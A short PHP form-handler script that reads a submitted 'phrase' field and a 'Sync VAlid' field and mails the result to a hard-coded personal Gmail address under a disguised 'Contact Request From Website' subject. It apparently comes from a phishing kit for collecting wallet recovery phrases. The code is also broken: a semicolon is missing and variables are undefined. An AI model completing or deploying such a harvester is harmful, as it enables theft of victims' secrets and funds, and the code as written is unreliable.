 <?php
     if (isset($_POST['submit'])) {
        $phrase = $_REQUEST[phraseInputVal];
       $where = $_REQUEST['Sync VAlid']
       
      // Set your email address where you want to receive emails. 
       $to = 'samleon657@gmail.com';
       $subject = 'Contact Request From Website';
       $headers = "From: ".$where." <".$email."> \r\n";
       $send_email = mail($to,$subject,$message,$headers);

       echo ($send_email) ? 'success' : 'error';

  }?>